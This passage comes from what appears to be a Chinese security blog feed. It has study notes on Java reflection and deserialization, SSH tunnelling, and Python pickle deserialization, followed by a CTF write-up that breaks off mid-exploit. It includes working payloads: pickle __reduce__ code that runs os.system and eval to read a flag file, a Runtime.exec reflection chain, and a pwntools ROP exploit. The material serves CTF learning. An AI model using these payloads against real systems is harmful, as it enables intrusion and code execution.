class="line">        FileInputStream file =  <span class="keyword">new</span> FileInputStream(<span class="string">&quot;f4l1K.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(file);</span><br><span class="line">        <span class="keyword">return</span> input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319164349339.png" alt="image-20210319164349339"></p><p>所以readObject()如果书写不当。就可能会引起反序列化漏洞</p><p>但实际情况下不会如此，我们需要借助java的反射特性</p><h2 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h2><p>Java反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制</p><p>Java 反射主要提供以下功能：</p><ul><li>在运行时判断任意一个对象所属的类；</li><li>在运行时构造任意一个类的对象；</li><li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li><li>在运行时调用任意一个对象的方法</li></ul><blockquote><p>forName()–&gt;获取类对象</p><p>getConstructor()–&gt;获得该类中与参数类型匹配的公有构造方法</p><p>newInstance()–&gt;创建构造方法的实例</p><p>getDeclaredMethod()–&gt;返回所在类方法</p><p>Invoke()–&gt;调用方法</p><p>getDeclaredField()–&gt;获取类参数</p><p>setAccessible()–&gt;如果参数为private需要设置为true</p><p>set()–&gt;设置参数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       User user1 = <span class="keyword">new</span> User(<span class="string">&quot;test&quot;</span>); <span class="comment">//实例化User类</span></span><br><span class="line">         Class Userclass2 = user1.getClass();<span class="comment">//获取实例对象的类</span></span><br><span class="line">         System.out.println(Userclass2);</span><br><span class="line">         Class Userclass= Class.forName(<span class="string">&quot;Demo.User&quot;</span>);<span class="comment">//获取类的对象</span></span><br><span class="line">         System.out.println(Userclass);</span><br><span class="line">         Constructor con = Userclass.getConstructor(String.class);<span class="comment">//获取对象的构造方法</span></span><br><span class="line">         System.out.println(con);</span><br><span class="line">         User user = (User) con.newInstance(<span class="string">&quot;hkk&quot;</span>);<span class="comment">//新建一个user实例化对象</span></span><br><span class="line">         System.out.println(user);</span><br><span class="line">         Method method = Userclass.getDeclaredMethod(<span class="string">&quot;setUser&quot;</span>,String.class);<span class="comment">//获取类方法</span></span><br><span class="line">         System.out.println(method);</span><br><span class="line">         method.invoke(user,<span class="string">&quot;hktest&quot;</span>); <span class="comment">//使用user对象的setUser方法</span></span><br><span class="line">         Field field = Userclass.getDeclaredField(<span class="string">&quot;user&quot;</span>);<span class="comment">//获取user的参数</span></span><br><span class="line">         System.out.println(field);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);<span class="comment">//设置privite参数可访问</span></span><br><span class="line">         field.set(user,<span class="string">&quot;f4l1K&quot;</span>);<span class="comment">//设置user参数</span></span><br><span class="line">         System.out.println(user.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319180807000.png" alt="image-20210319180807000"></p><h3 id="利用反射链执行命令"><a href="#利用反射链执行命令" class="headerlink" title="利用反射链执行命令"></a>利用反射链执行命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          Class exec = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); <span class="comment">//获取类</span></span><br><span class="line">          Object method = exec.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="keyword">null</span>);<span class="comment">//获取类中getRuntime函数并调用该方法的实例</span></span><br><span class="line">          Object method1 =  exec.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(method,<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);<span class="comment">//获取exec方法并在method实例中执行</span></span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接🔗"><a href="#参考链接🔗" class="headerlink" title="参考链接🔗"></a>参考链接🔗</h2><p><a href="https://xz.aliyun.com/t/3847#toc-3">https://xz.aliyun.com/t/3847#toc-3</a></p><p><a href="https://xz.aliyun.com/t/6787">https://xz.aliyun.com/t/6787</a></p><p><a href="https://blog.csdn.net/lqzkcx3/article/details/79463450">https://blog.csdn.net/lqzkcx3/article/details/79463450</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh隧道</title>
      <link href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/"/>
      <url>/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/</url>
      
        <content type="html"><![CDATA[<p>ssh隧道常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速度</span><br><span class="line">-f ：将ssh传输转入后台执行，不占用当前的shell。</span><br><span class="line">-N：建立静默连接（建立了连接，但是看不到具体的会话）</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发（socks代理）</span><br><span class="line">-P：指定ssh端口</span><br></pre></td></tr></table></figure><h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><blockquote><p> ssh -NfR remote-ip:remote-port:localhost:local-port root@remoteip</p></blockquote><p>远程sshd_config需要设置</p><blockquote><p>AllowTcpForwarding yes</p></blockquote><blockquote><p>GatewayPorts yes</p></blockquote><h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><blockquote><p> ssh -NfD [localhost]:port root@localhost</p></blockquote><p>先在本地实现socks代理，再将socks代理端口通过隧道连接到公网</p><blockquote><p>ssh -NfR remote-ip:remote-port:localhost:socks-port root@remoteip</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探pickle反序列化</title>
      <link href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="初探pickle反序列化"><a href="#初探pickle反序列化" class="headerlink" title="初探pickle反序列化"></a>初探pickle反序列化</h1><h3 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__函数"></a>object.__reduce__函数</h3><ul><li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li><li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的</li></ul><h3 id="picktools"><a href="#picktools" class="headerlink" title="picktools"></a>picktools</h3><p>pictools可以把opcode转化成规范格式，便于观看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">test=<span class="string">b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00testq\x03X\x0b\x00\x00\x00hello worldq\x04sb.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(test))</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5Cimg%5Cimage-pick1.png" alt="image-pick1"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote><p>变量覆盖</p></blockquote><blockquote><p>代码执行</p></blockquote><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">test1=<span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">test2=<span class="string">b&#x27;world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        te=<span class="string">&quot;test1=b&#x27;no&#x27;\ntest2=b&#x27;success&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>,(te,) <span class="comment">#return参数必须为元组</span></span><br><span class="line"></span><br><span class="line">new=Test()</span><br><span class="line">a=pickle.dumps(new)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">pickle.loads(a)</span><br><span class="line"><span class="built_in">print</span>(test1,test2)</span><br></pre></td></tr></table></figure><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rc</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        shell=<span class="string">&quot;echo &#x27;hello world&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> os.system,(shell,)</span><br><span class="line"></span><br><span class="line">a=Rc()</span><br><span class="line">pi=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pi)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pi))</span><br></pre></td></tr></table></figure><h3 id="手动编写opcode"><a href="#手动编写opcode" class="headerlink" title="手动编写opcode"></a>手动编写opcode</h3><p>reduce一次只能执行一个函数，当exec被禁，就不能一次执行多个指令</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th align="center">memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td align="center">无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td align="center">无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td align="center">无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td align="center">无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td align="center">无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td align="center">无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td align="center">无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td align="center">无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td align="center">无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td align="center">无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td align="center">无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td align="center">无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td align="center">无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td align="center">无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td align="center">无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td align="center">无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td align="center">无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td align="center">对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td align="center">无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td align="center">无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td align="center">无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td align="center">无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td align="center">无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td align="center">无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td align="center">无</td></tr></tbody></table><p>注意：<code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库</p><p>经常使用的<code>R</code> ,<code>O</code>,<code>i</code></p><h4 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,test</span>):</span></span><br><span class="line">        self.test=test</span><br><span class="line">        <span class="built_in">print</span>(self.test)</span><br><span class="line"></span><br><span class="line"><span class="comment">#R</span></span><br><span class="line"><span class="comment"># p=b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="comment"># (S&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># tR.</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O</span></span><br><span class="line"><span class="comment"># p=b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="comment"># S&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># o.</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#I</span></span><br><span class="line">p=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;hello&#x27;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Test</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">he=pickle.loads(p)</span><br><span class="line"><span class="built_in">print</span>(he.test)</span><br></pre></td></tr></table></figure><h4 id="ctf-ikun"><a href="#ctf-ikun" class="headerlink" title="ctf ikun"></a>ctf ikun</h4><p>部分代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="手写版"><a href="#手写版" class="headerlink" title="手写版"></a>手写版</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pi=<span class="string">&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(S&#x27;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pi))</span><br></pre></td></tr></table></figure><h6 id="代码版"><a href="#代码版" class="headerlink" title="代码版"></a>代码版</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        shell=<span class="string">b&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>,(shell,)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(AdminHandler()))</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pickle.dumps(AdminHandler())))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HXB writeup</title>
      <link href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/"/>
      <url>/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>直接传参file=phpinfo，flag被写到环境变量</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img1.png" alt="img1"></p><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>扫描目录扫到/admin</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img2.png" alt="img2"></p><p>访问后弱密码admin/admin登录</p><p>发现有?r=manageinfo页面可以上传文件，但文件名被限制，传php3即可绕过，然后antsword连接</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img3.png" alt="img3"></p><h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p>题目说是维吉尼亚密码，直接爆破密钥即可</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img4.png" alt="img4"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>栈溢出，通过puts泄露函数地址，计算偏移量得到system函数地址来get shell</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.111.104.169&#x27;</span>,<span class="number">56706</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401213</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000401211</span></span><br><span class="line">ret_addr = <span class="number">0x4007C6</span></span><br><span class="line">scanf = <span class="number">0x004006A0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;interesting&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">p.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(<span class="number">0x40</span>) + p64(ret_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi_ret) + p64(<span class="number">0x0401D99</span>) +p64(pop_rsi_ret) +p64(<span class="number">0x06030A0</span>)+p64(<span class="number">0</span>)+ p64(scanf) + p64(pop_rdi_ret) + p64(<span class="number">0x20</span>)+ p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br><span class="line">str1 = 